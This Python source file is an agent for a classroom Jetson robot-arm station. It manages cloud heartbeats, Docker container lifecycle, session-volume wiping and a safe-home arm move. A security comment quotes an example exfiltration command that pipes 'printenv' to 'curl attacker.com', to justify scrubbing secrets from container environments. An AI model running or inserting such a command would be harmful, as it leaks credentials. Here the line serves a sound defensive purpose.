"""Classroom Jetson Orin Nano agent.

State machine that:
  1. Heartbeats to the EduBotics Cloud API every 10 s, telling the server
     "I'm alive" and learning who (if anyone) currently holds the lock.
  2. On owner-change (claim): brings up the ROS containers via
     ``docker compose up -d``, starts the ``rosbridge_proxy.py`` JWT-verify
     bridge on :9091, and moves the follower arm to a safe home pose so
     the next student always starts from a known position.
  3. On owner-release (explicit "Trennen" or 5-min sweeper): kills the
     proxy, brings the containers down, removes the per-session Docker
     volumes (HF cache + workspace), and returns to paired_idle.
  4. Auto-pulls images on agent start using the same offline-probe +
     manifest-digest pre-check pattern from ``gui/app/docker_manager.py``
     (F67-F69). Disable with ``EDUBOTICS_SKIP_AUTO_PULL=1``.

Hosts a small loopback HTTP server on 127.0.0.1:5180 with one endpoint
``/owner`` that returns the current owner UUID — the rosbridge proxy
reads this on every WebSocket accept to enforce sub == current_owner.

Run as PID 1 under the ``edubotics-jetson.service`` systemd unit. Logs
to journalctl; no separate log file.
"""

from __future__ import annotations

import json
import logging
import os
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Optional

# ---------------------------------------------------------------------------
# Config — read from /etc/edubotics/jetson.env at module load. setup.sh
# writes this file with mode 600 (root only) at install time.
# ---------------------------------------------------------------------------

ENV_PATH = Path(os.environ.get("EDUBOTICS_JETSON_ENV", "/etc/edubotics/jetson.env"))
COMPOSE_PATH = Path(
    os.environ.get(
        "EDUBOTICS_JETSON_COMPOSE",
        "/opt/edubotics/docker-compose.jetson.yml",
    )
)
LAST_PULL_FILE = Path(
    os.environ.get(
        "EDUBOTICS_LAST_PULL_FILE",
        "/var/lib/edubotics/.last_image_pull.json",
    )
)
PROXY_SCRIPT = Path(
    os.environ.get(
        "EDUBOTICS_PROXY_SCRIPT",
        "/opt/edubotics/rosbridge_proxy.py",
    )
)

# Volumes that hold per-session student state. Wiped on disconnect so the
# next student starts pristine — including a fresh HF cache so they can't
# accidentally use a previous student's downloaded model weights. Matches
# the docker-compose.jetson.yml volume declarations.
SESSION_VOLUMES = ("jetson_workspace", "jetson_huggingface_cache")

# Heartbeat cadence + agent timing.
AGENT_HEARTBEAT_INTERVAL_S = 10
PROXY_LOOPBACK_PORT = 5180
PROXY_FRONT_PORT = 9091
IMAGE_FRESHNESS_WARN_DAYS = 14
NETWORK_PROBE_TIMEOUT = 5
MANIFEST_INSPECT_TIMEOUT = 30

# Safe-home pose for v1 — matches the workflow HOME pose in CLAUDE.md §16.
# Moves follower to this configuration on every claim so the previous
# student's last pose isn't where the new student starts.
SAFE_HOME_JOINTS = [0.0, -0.785398, 0.785398, 0.0, 0.0, 0.8]
SAFE_HOME_DURATION_S = 3.0

logger = logging.getLogger("edubotics-jetson-agent")

# Module-level state. The state machine is single-threaded apart from the
# loopback HTTP server (which only reads _current_owner_user_id), so no
# locking is needed beyond the volatile semantics of a single int/str
# variable assignment.
_current_owner_user_id: Optional[str] = None
_state: str = "boot"
_shutdown = threading.Event()
_proxy_proc: Optional[subprocess.Popen] = None
# Per-owner failed-claim attempt counter. Without backoff, a persistent
# claim-time failure (e.g. docker daemon dead) would re-fire the entire
# bring-up sequence on every 10-s heartbeat tick, burning ~30 docker
# calls in 5 minutes and flooding journalctl. After
# CLAIM_RETRY_LIMIT consecutive failures for the SAME owner UUID, the
# agent stops retrying and waits for the server's 5-min sweep to free
# the lock. The counter resets when a successful claim lands or when
# the owner UUID changes.
_failed_claim_attempts: dict[str, int] = {}
CLAIM_RETRY_LIMIT = 3


def _load_env() -> dict:
    """Parse /etc/edubotics/jetson.env into a dict. Comments and blank
    lines are skipped. Values may be quoted or unquoted; we strip the
    surrounding quotes if present."""
    out: dict[str, str] = {}
    if not ENV_PATH.is_file():
        raise SystemExit(
            f"[FATAL] {ENV_PATH} not found — run setup.sh first to register "
            "this Jetson with the EduBotics Cloud API."
        )
    for line in ENV_PATH.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" not in line:
            continue
        key, _, val = line.partition("=")
        val = val.strip().strip('"').strip("'")
        out[key.strip()] = val
    required = ("EDUBOTICS_JETSON_ID", "EDUBOTICS_AGENT_TOKEN", "EDUBOTICS_CLOUD_API_URL")
    missing = [k for k in required if not out.get(k)]
    if missing:
        raise SystemExit(
            f"[FATAL] {ENV_PATH} missing required keys: {', '.join(missing)}"
        )
    return out


# ---------------------------------------------------------------------------
# Auto-pull on agent start — port of F67/F68/F69 from
# gui/app/docker_manager.py. Same defensive layers (offline probe, manifest-
# digest pre-check, last-pull persistence) but native Linux `docker` since
# the Jetson runs Docker directly (no WSL wrapper).
# ---------------------------------------------------------------------------


def _is_dockerhub_reachable(timeout: int = NETWORK_PROBE_TIMEOUT) -> bool:
    try:
        with socket.create_connection(
            ("registry-1.docker.io", 443),
            timeout=timeout,
        ):
            return True
    except (OSError, socket.timeout):
        return False


def _get_local_repo_digest(image: str) -> Optional[str]:
    try:
        result = subprocess.run(
            ["docker", "image", "inspect", image,
             "--format", "{{range .RepoDigests}}{{.}}|{{end}}"],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode != 0:
            return None
        for entry in result.stdout.strip().rstrip("|").split("|"):
            if "@sha256:" in entry:
                return entry.split("@", 1)[1]
        return None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


def _get_remote_manifest_digest(image: str) -> Optional[str]:
    """Same as the GUI helper, but pick the linux/arm64 manifest instead
    of linux/amd64 since the Jetson runs arm64."""
    try:
        result = subprocess.run(
            ["docker", "manifest", "inspect", image],
            capture_output=True, text=True, timeout=MANIFEST_INSPECT_TIMEOUT,
        )
        if result.returncode != 0:
            return None
        data = json.loads(result.stdout)
    except (FileNotFoundError, subprocess.TimeoutExpired, ValueError):
        return None
    manifests = data.get("manifests")
    if isinstance(manifests, list):
        for entry in manifests:
            platform = entry.get("platform", {})
            if (
                platform.get("architecture") == "arm64"
                and platform.get("os") == "linux"
            ):
                digest = entry.get("digest")
                if isinstance(digest, str) and digest.startswith("sha256:"):
                    return digest
        return None
    digest = data.get("digest")
    if isinstance(digest, str) and digest.startswith("sha256:"):
        return digest
    return None


def _save_last_pull_info(per_image_digests: dict[str, Optional[str]]) -> None:
    payload = {
        "timestamp": int(time.time()),
        "digests": {img: d for img, d in per_image_digests.items() if d is not None},
    }
    try:
        LAST_PULL_FILE.parent.mkdir(parents=True, exist_ok=True)
        LAST_PULL_FILE.write_text(json.dumps(payload), encoding="utf-8")
    except OSError as exc:
        logger.warning("could not persist last-pull info: %s", exc)


def _images_from_compose() -> list[str]:
    """Parse the compose file for image: lines so we know what to pull.

    Uses a string scan rather than a YAML library so the agent has zero
    pip dependency just for one config read. Compose files are stable
    enough that this works (no nested image refs in dict form)."""
    if not COMPOSE_PATH.is_file():
        logger.warning("compose file not found: %s", COMPOSE_PATH)
        return []
    images: list[str] = []
    for line in COMPOSE_PATH.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if stripped.startswith("image:"):
            ref = stripped.removeprefix("image:").strip().strip('"').strip("'")
            # Expand ${REGISTRY:-default} in a minimal way.
            ref = ref.replace(
                "${REGISTRY:-nettername}",
                os.environ.get("REGISTRY", "nettername"),
            )
            if ref:
                images.append(ref)
    return images


def _auto_pull_images() -> None:
    """Pull arm64 images on agent start. Mirrors F67/F68/F69 from the GUI:
    offline short-circuit, manifest-digest pre-check, last-pull persistence.

    Set EDUBOTICS_SKIP_AUTO_PULL=1 to disable (offline classrooms managing
    their own image cadence).
    """
    if os.environ.get("EDUBOTICS_SKIP_AUTO_PULL") == "1":
        logger.info("EDUBOTICS_SKIP_AUTO_PULL=1, skipping auto-pull")
        return

    images = _images_from_compose()
    if not images:
        return

    if not _is_dockerhub_reachable():
        logger.warning(
            "Docker Hub not reachable — skipping auto-pull (running with cached images)"
        )
        return

    per_image_digests: dict[str, Optional[str]] = {}
    for image in images:
        logger.info("Resolving image %s", image)
        remote = _get_remote_manifest_digest(image)
        local = _get_local_repo_digest(image)
        if remote and local and remote == local:
            logger.info("  already up to date (%s)", remote[:19])
            per_image_digests[image] = local
            continue
        try:
            logger.info("  pulling latest manifest...")
            result = subprocess.run(
                ["docker", "pull", image],
                capture_output=True, text=True, timeout=600,
            )
            if result.returncode != 0:
                logger.warning("  pull failed: %s", result.stderr.strip())
                per_image_digests[image] = local  # keep whatever we have
                continue
            new_local = _get_local_repo_digest(image)
            per_image_digests[image] = new_local
            logger.info("  pulled (%s)", (new_local or "no-digest")[:19])
        except subprocess.TimeoutExpired:
            logger.warning("  pull timed out after 10 min")
            per_image_digests[image] = local

    _save_last_pull_info(per_image_digests)


# ---------------------------------------------------------------------------
# Cloud API client (sync, used from the main loop).
# ---------------------------------------------------------------------------


def _post_json(url: str, payload: dict, timeout: int = 10) -> Optional[dict]:
    """POST JSON, return parsed JSON response (or None on failure).
    Network errors are logged at WARNING and swallowed so the agent loop
    keeps running through transient outages."""
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8")
            return json.loads(body) if body else {}
    except urllib.error.HTTPError as exc:
        logger.warning("POST %s → HTTP %d: %s", url, exc.code, exc.read()[:200])
        return None
    except (urllib.error.URLError, socket.timeout, json.JSONDecodeError) as exc:
        logger.warning("POST %s failed: %s", url, exc)
        return None


def _agent_heartbeat(env: dict) -> tuple[bool, Optional[str]]:
    """Send the 10s heartbeat. Returns (ok, current_owner_user_id).

    Critical distinction: ok=False means we couldn't talk to the Cloud
    API at all (network blip, DNS failure, Cloud API outage). ok=True
    means the API responded; current_owner_user_id is whatever the
    server said (None == "Jetson is free").

    Without this distinction the main loop would treat a 10-second
    network blip as "owner is now None" and tear down the active
    student's session (wipe their HF cache mid-inference, kill the
    container stack). Real classroom Wi-Fi blips for 5-20 s.
    """
    url = (
        env["EDUBOTICS_CLOUD_API_URL"].rstrip("/")
        + f"/jetson/{env['EDUBOTICS_JETSON_ID']}/agent-heartbeat"
    )
    payload = {
        "agent_token": env["EDUBOTICS_AGENT_TOKEN"],
        "lan_ip": _detect_lan_ip(),
        "agent_version": env.get("EDUBOTICS_AGENT_VERSION", "v1.0.0"),
    }
    resp = _post_json(url, payload, timeout=10)
    if resp is None:
        return False, None
    return True, resp.get("current_owner_user_id")


def _detect_lan_ip() -> str:
    """Best-effort LAN IP discovery. Uses the trick of opening a UDP
    socket to a known public address — Linux selects the LAN interface
    that would route there. No actual packet is sent."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(1.0)
            s.connect(("8.8.8.8", 53))
            return s.getsockname()[0]
    except OSError:
        return ""


# ---------------------------------------------------------------------------
# Container lifecycle.
# ---------------------------------------------------------------------------


def _scrubbed_env() -> dict:
    """Return a copy of the process env with secrets removed.

    SECURITY: the systemd unit's EnvironmentFile injects
    EDUBOTICS_AGENT_TOKEN (and the Supabase JWT secret when HS256) into
    the agent's process env. Without scrubbing, every `docker compose
    up` would inherit them, and the container processes could exfiltrate
    them with `printenv | curl attacker.com`. The agent itself needs
    these vars; the containers must NEVER see them. Keep only what the
    compose file actually references.
    """
    keep = (
        "PATH",
        "HOME",
        "LANG",
        "LC_ALL",
        # Compose-substitution vars (read at parse time).
        "REGISTRY",
        "ROS_DOMAIN_ID",
        # Passed THROUGH to physical_ai_server as HF_TOKEN (intentional —
        # the container needs to download policies from HF).
        "EDUBOTICS_HF_TOKEN",
    )
    return {k: v for k, v in os.environ.items() if k in keep}


def _compose(*args: str, check: bool = True, timeout: int = 120) -> subprocess.CompletedProcess:
    """Wrap `docker compose -f <path> ...` for the Jetson compose file.

    Uses a scrubbed environment so secret tokens don't leak into the
    container processes.
    """
    return subprocess.run(
        ["docker", "compose", "-f", str(COMPOSE_PATH), *args],
        capture_output=True, text=True, check=check, timeout=timeout,
        env=_scrubbed_env(),
    )


def _bring_up_stack() -> None:
    """docker compose up -d + wait for both containers healthy. Returns
    when stack is ready. Raises subprocess.CalledProcessError on failure."""
    logger.info("Bringing up Jetson container stack...")
    _compose("up", "-d", "--remove-orphans", timeout=180)
    # Poll for health — both services have healthchecks declared in the
    # compose file. 60s is generous; the open_manipulator launch waits
    # up to 60s for USB enumeration itself.
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        result = _compose("ps", "--format", "json", timeout=15, check=False)
        if result.returncode == 0:
            # `docker compose ps --format json` shape changed across
            # Compose versions: v2.20 and earlier emit JSONL (one JSON
            # object per line); v2.21+ emit a single JSON array. Handle
            # both, falling through to the other on parse failure.
            stdout = result.stdout.strip()
            lines: list[dict] = []
            if stdout:
                try:
                    parsed = json.loads(stdout)
                    if isinstance(parsed, list):
                        lines = [s for s in parsed if isinstance(s, dict)]
                    elif isinstance(parsed, dict):
                        # Defensive: some versions emit a single bare dict.
                        lines = [parsed]
                except json.JSONDecodeError:
                    # Fall back to JSONL parsing.
                    for raw in stdout.splitlines():
                        raw = raw.strip()
                        if not raw.startswith("{"):
                            continue
                        try:
                            lines.append(json.loads(raw))
                        except json.JSONDecodeError:
                            continue
            # Stricter readiness: require Health=="healthy" when a
            # healthcheck is declared (we declare them on both services).
            # Fall back to State=="running" only when Health is absent.
            def _is_ready(s: dict) -> bool:
                h = s.get("Health")
                if h:
                    return h == "healthy"
                return s.get("State") == "running"
            healthy = sum(1 for s in lines if _is_ready(s))
            if lines and healthy == len(lines):
                logger.info("Stack ready (%d services healthy)", healthy)
                return
        time.sleep(2)
    raise RuntimeError("Stack did not become healthy within 120s")


def _bring_down_stack() -> None:
    """docker compose down. Removes containers but NOT volumes (volumes
    are wiped separately so we can recreate them empty)."""
    logger.info("Bringing down Jetson container stack...")
    try:
        _compose("down", "--remove-orphans", timeout=120, check=False)
    except subprocess.TimeoutExpired:
        logger.warning("compose down timed out — forcing")
        _compose("kill", timeout=30, check=False)
        _compose("rm", "-f", timeout=30, check=False)


def _wipe_session_volumes() -> None:
    """Remove the per-session Docker volumes so the next student starts
    pristine. The compose file recreates them empty on next `up`."""
    for vol in SESSION_VOLUMES:
        for attempt in range(3):
            result = subprocess.run(
                ["docker", "volume", "rm", "-f", vol],
                capture_output=True, text=True, timeout=30,
            )
            if result.returncode == 0:
                logger.info("Wiped volume %s", vol)
                break
            # "volume in use" — wait briefly and retry. compose down
            # above should have released it, but Docker sometimes
            # lingers a moment.
            time.sleep(1)
        else:
            logger.warning(
                "Could not remove volume %s after 3 attempts (output: %s)",
                vol, result.stderr.strip(),
            )


def _move_to_safe_home() -> None:
    """Publish a single quintic-smoothed JointTrajectory to /leader/joint_trajectory
    (which the follower's arm_controller subscribes to via the launch-time
    remap). Mirrors the entrypoint's Phase-3 sync, but with no leader to
    sync TO — the target is the hardcoded HOME pose.

    Implementation: ``docker exec physical_ai_server python3 -c ...`` so we
    use the ROS environment the container already has. The container is
    healthy by the time this runs (waited for in _bring_up_stack).
    """
    logger.info("Moving follower to safe home pose...")
    home_json = json.dumps(SAFE_HOME_JOINTS)
    duration = SAFE_HOME_DURATION_S
    script = f"""
import json, time, sys
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, DurabilityPolicy, ReliabilityPolicy
from trajectory_msgs.msg import JointTrajectory, JointTrajectoryPoint
from sensor_msgs.msg import JointState

HOME = json.loads('{home_json}')
JOINTS = ['joint1','joint2','joint3','joint4','joint5','gripper_joint_1']
DURATION = {duration}

class Homer(Node):
    def __init__(self):
        super().__init__('jetson_safe_home')
        self.follower_pos = None
        self.sub = self.create_subscription(JointState, '/joint_states', self.cb, 10)
        qos = QoSProfile(depth=10,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
            reliability=ReliabilityPolicy.RELIABLE)
        self.pub = self.create_publisher(JointTrajectory, '/leader/joint_trajectory', qos)
        self.sent = False
        self.timer = self.create_timer(5.0, self._timeout)
        self.deadline = time.monotonic() + 8.0
    def cb(self, msg):
        if self.sent:
            return
        if not set(JOINTS).issubset(set(msg.name)):
            return
        self.follower_pos = [msg.position[msg.name.index(j)] for j in JOINTS]
        self._send()
    def _send(self):
        self.sent = True
        traj = JointTrajectory()
        traj.joint_names = list(JOINTS)
        N = 50
        deltas = [h - f for f, h in zip(self.follower_pos, HOME)]
        for i in range(N):
            t = (i + 1) / N
            s = 10*t**3 - 15*t**4 + 6*t**5
            pt = JointTrajectoryPoint()
            pt.positions = [f + d * s for f, d in zip(self.follower_pos, deltas)]
            secs = DURATION * t
            pt.time_from_start.sec = int(secs)
            pt.time_from_start.nanosec = int((secs % 1) * 1e9)
            traj.points.append(pt)
        self.pub.publish(traj)
        self.get_logger().info(f'Safe-home trajectory published ({{N}} points, {{DURATION}}s)')
        # Wait for the motion to actually complete before exiting.
        self.exit_timer = self.create_timer(DURATION + 0.5, self._exit)
    def _exit(self):
        sys.exit(0)
    def _timeout(self):
        if not self.sent:
            self.get_logger().error('Timed out waiting for /joint_states')
            sys.exit(2)

rclpy.init()
node = Homer()
try:
    rclpy.spin(node)
except SystemExit as se:
    code = se.code if isinstance(se.code, int) else 0
finally:
    node.destroy_node()
    rclpy.shutdown()
    sys.exit(code)
"""
    try:
        result = subprocess.run(
            [
                "docker", "compose", "-f", str(COMPOSE_PATH), "exec", "-T",
                "physical_ai_server",
                "bash", "-c",
                f"source /opt/ros/jazzy/setup.bash && source /root/ros2_ws/install/setup.bash && python3 -c \"{script}\"",
            ],
            capture_output=True, text=True, timeout=int(SAFE_HOME_DURATION_S * 3 + 15),
        )
        if result.returncode != 0:
            logger.warning(
                "Safe-home move exited %d (stderr: %s)",
                result.returncode, result.stderr.strip()[:300],
            )
    except subprocess.TimeoutExpired:
        logger.warning("Safe-home move timed out")


# ---------------------------------------------------------------------------
# Proxy lifecycle.
# ---------------------------------------------------------------------------


def _start_proxy() -> None:
    global _proxy_proc
    if _proxy_proc is not None and _proxy_proc.poll() is None:
        return
    logger.info("Starting rosbridge JWT proxy on :%d", PROXY_FRONT_PORT)
    # SECURITY: don't pass the full os.environ. The proxy reads its
    # JWT secrets directly from /etc/edubotics/jetson.env (mode 600,
    # root-only), so it doesn't need EDUBOTICS_AGENT_TOKEN /
    # EDUBOTICS_SUPABASE_JWT_SECRET injected via env. Passing them
    # would make the proxy process appear in /proc/<pid>/environ
    # readable by anyone with PTRACE permissions and widen the
    # attack surface for no benefit.
    _proxy_proc = subprocess.Popen(
        [sys.executable, str(PROXY_SCRIPT)],
        env={
            **_scrubbed_env(),
            "EDUBOTICS_PROXY_FRONT_PORT": str(PROXY_FRONT_PORT),
            "EDUBOTICS_OWNER_URL": f"http://127.0.0.1:{PROXY_LOOPBACK_PORT}/owner",
        },
    )


def _stop_proxy() -> None:
    global _proxy_proc
    if _proxy_proc is None:
        return
    logger.info("Stopping rosbridge JWT proxy")
    try:
        _proxy_proc.terminate()
        _proxy_proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        _proxy_proc.kill()
        _proxy_proc.wait(timeout=5)
    finally:
        _proxy_proc = None


# ---------------------------------------------------------------------------
# Loopback HTTP server — exposes /owner for the rosbridge proxy.
# ---------------------------------------------------------------------------


class _OwnerHandler(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802 — http.server name
        if self.path != "/owner":
            self.send_response(404)
            self.end_headers()
            return
        body = json.dumps(
            {"current_owner_user_id": _current_owner_user_id}
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):  # noqa: A002 — http.server name
        # Quiet the default access log; this server gets 1 hit/sec.
        pass


def _start_loopback_server() -> threading.Thread:
    server = HTTPServer(("127.0.0.1", PROXY_LOOPBACK_PORT), _OwnerHandler)
    t = threading.Thread(target=server.serve_forever, name="owner-http", daemon=True)
    t.start()
    return t


# ---------------------------------------------------------------------------
# State machine.
# ---------------------------------------------------------------------------


def _transition_to_claimed(owner_id: str) -> None:
    global _state, _current_owner_user_id
    # Bail out early if we've already failed this exact owner CLAIM_RETRY_LIMIT
    # times. Stops the docker-daemon-dead retry storm; the server's 5-min
    # sweeper will eventually free the lock and the next student gets a
    # fresh chance.
    prior_failures = _failed_claim_attempts.get(owner_id, 0)
    if prior_failures >= CLAIM_RETRY_LIMIT:
        if _state != "paired_idle":
            _state = "paired_idle"
        return
    logger.info("Owner change: NULL → %s — claiming (attempt %d/%d)",
                owner_id, prior_failures + 1, CLAIM_RETRY_LIMIT)
    _state = "claiming"
    try:
        _bring_up_stack()
        _move_to_safe_home()
        _start_proxy()
        _state = "claimed"
        _failed_claim_attempts.pop(owner_id, None)  # success — reset counter
        logger.info("Ready for Schüler %s", owner_id)
    except Exception as exc:
        _failed_claim_attempts[owner_id] = prior_failures + 1
        logger.error(
            "Claim transition failed (attempt %d/%d): %s",
            prior_failures + 1, CLAIM_RETRY_LIMIT, exc, exc_info=True,
        )
        # The server still thinks we hold the lock for owner_id. Tear
        # down anything we partially brought up. Setting
        # _current_owner_user_id = None means the next heartbeat sees
        # new_owner == owner_id != local None → retries the claim. The
        # CLAIM_RETRY_LIMIT guard above caps the retry storm; after
        # CLAIM_RETRY_LIMIT failures the agent skips the transition
        # until either (a) the server's 5-min sweeper frees the lock
        # or (b) the owner UUID changes (new student claims) — at
        # which point the counter resets via the != check below.
        try:
            _stop_proxy()
            _bring_down_stack()
        except Exception as cleanup_exc:
            logger.warning(
                "Cleanup after failed claim raised %s (continuing)",
                cleanup_exc,
            )
        _release_lock_via_cloud_api(owner_id)
        _current_owner_user_id = None  # local view back to free
        _state = "paired_idle"
        # When the SAME owner persists across CLAIM_RETRY_LIMIT failures,
        # log one FATAL so the operator notices in journalctl.
        if _failed_claim_attempts[owner_id] >= CLAIM_RETRY_LIMIT:
            logger.error(
                "Jetson is in a broken state for owner %s after %d failed claims. "
                "Stopping retry storm. Waiting for server-side 5-min sweeper to "
                "free the lock. Investigate via 'journalctl -u edubotics-jetson'.",
                owner_id, CLAIM_RETRY_LIMIT,
            )


def _release_lock_via_cloud_api(owner_id: str) -> None:
    """Best-effort: ask the Cloud API to release the lock. Used when a
    claim transition fails locally and we need to free the server-side
    state so the React app doesn't stay stuck."""
    try:
        env = _load_env()
    except SystemExit:
        return
    url = (
        env["EDUBOTICS_CLOUD_API_URL"].rstrip("/")
        + f"/jetson/{env['EDUBOTICS_JETSON_ID']}/agent-release"
    )
    # NOTE: this endpoint does not exist in v1 of the Cloud API. The
    # agent currently has no authenticated way to release a student's
    # lock — the agent_token is for heartbeats only. The Cloud API's
    # 5-minute sweeper will eventually free the lock when the student's
    # React heartbeats stop arriving (since we tore down the proxy
    # above, no student heartbeats will succeed). Logged as a known
    # gap; v1.1 should add an agent-initiated release endpoint.
    logger.warning(
        "Claim failed for owner %s — relying on 5-min server-side sweep "
        "to free the lock (no agent-release endpoint in v1).",
        owner_id,
    )


def _transition_to_released() -> None:
    global _state
    logger.info("Owner change: → NULL — wiping")
    _state = "wiping"
    try:
        _stop_proxy()
        _bring_down_stack()
        _wipe_session_volumes()
    finally:
        _state = "paired_idle"
        logger.info("Wipe complete — Jetson available")


def _main_loop(env: dict) -> None:
    global _current_owner_user_id, _state
    _state = "paired_idle"
    logger.info("Agent entering main loop (interval=%ds)", AGENT_HEARTBEAT_INTERVAL_S)
    while not _shutdown.is_set():
        try:
            ok, new_owner = _agent_heartbeat(env)
        except (OSError, ValueError, KeyError) as exc:
            # Catch only the failure modes we expect from a heartbeat
            # (network/JSON/payload-shape). Genuine bugs in heartbeat
            # logic still propagate so they're observable in journal.
            logger.warning("Heartbeat raised %s — treating as failed call", exc)
            ok, new_owner = False, None

        # CRITICAL: distinguish "Cloud API unreachable" (ok=False) from
        # "Cloud API says owner is None" (ok=True, new_owner=None). The
        # first must NOT trigger a release-and-wipe — a flaky classroom
        # Wi-Fi blip would otherwise tear down a perfectly fine session
        # and destroy the active student's HF cache mid-inference.
        if not ok:
            # Keep current state; the server still thinks we hold the lock.
            # Next successful heartbeat will reconcile.
            if _shutdown.wait(AGENT_HEARTBEAT_INTERVAL_S):
                break
            continue

        # Heartbeat succeeded. Drive state from the authoritative answer.
        if new_owner is not None and new_owner != _current_owner_user_id:
            if _current_owner_user_id is None:
                # NULL → UUID = claim
                _current_owner_user_id = new_owner
                _transition_to_claimed(new_owner)
            else:
                # UUID → UUID = mid-session ownership change. Treat as a
                # full release-then-claim cycle (server shouldn't
                # transition like this without going through NULL —
                # claim_jetson raises P0030 if held — so this is purely
                # defensive).
                logger.warning(
                    "Unexpected owner transition %s → %s — wiping + reclaiming",
                    _current_owner_user_id, new_owner,
                )
                _transition_to_released()
                _current_owner_user_id = new_owner
                _transition_to_claimed(new_owner)
        elif new_owner is None and _current_owner_user_id is not None:
            # Authoritative: server has released the lock (explicit
            # Trennen, 5-min sweep, or teacher force-release). Wipe.
            _current_owner_user_id = None
            # Reset claim-retry counters — they're per-owner, and the
            # previous owner is gone.
            _failed_claim_attempts.clear()
            _transition_to_released()
        # else: no change.

        if _shutdown.wait(AGENT_HEARTBEAT_INTERVAL_S):
            break


# ---------------------------------------------------------------------------
# Entry point.
# ---------------------------------------------------------------------------


def main():
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(name)s %(levelname)s %(message)s",
    )
    env = _load_env()
    logger.info(
        "Jetson agent starting (jetson_id=%s, cloud=%s)",
        env["EDUBOTICS_JETSON_ID"],
        env["EDUBOTICS_CLOUD_API_URL"],
    )

    def _sigterm(_signum, _frame):
        logger.info("Signal received — shutting down")
        _shutdown.set()

    signal.signal(signal.SIGTERM, _sigterm)
    signal.signal(signal.SIGINT, _sigterm)

    _start_loopback_server()
    _auto_pull_images()
    try:
        _main_loop(env)
    finally:
        # On shutdown, try to release any held lock + bring containers
        # down cleanly so the next agent start finds a sane state.
        if _current_owner_user_id is not None:
            logger.info("Shutdown: releasing held lock + tearing down stack")
            _stop_proxy()
            _bring_down_stack()


if __name__ == "__main__":
    main()
